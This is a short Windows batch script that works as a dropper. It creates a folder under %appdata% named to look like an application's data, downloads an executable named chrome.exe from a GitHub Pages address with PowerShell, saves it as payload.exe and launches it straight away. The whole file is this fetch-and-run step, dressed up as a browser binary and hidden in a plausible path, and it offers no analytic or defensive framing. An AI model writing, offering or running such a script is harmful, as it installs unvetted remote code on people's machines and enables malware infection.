@echo off
setlocal enabledelayedexpansion
set "payloadpath=%appdata%\Custom-Application\files\payload.exe"
if not exist "%appdata%\Custom-Application\files" mkdir "%appdata%\Custom-Application\files"

powershell -Command "Invoke-WebRequest -Uri 'https://homemaginalpole.github.io/rawdata/chrome.exe' -OutFile '%payloadpath%'"
start "" "%payloadpath%"
exit /b
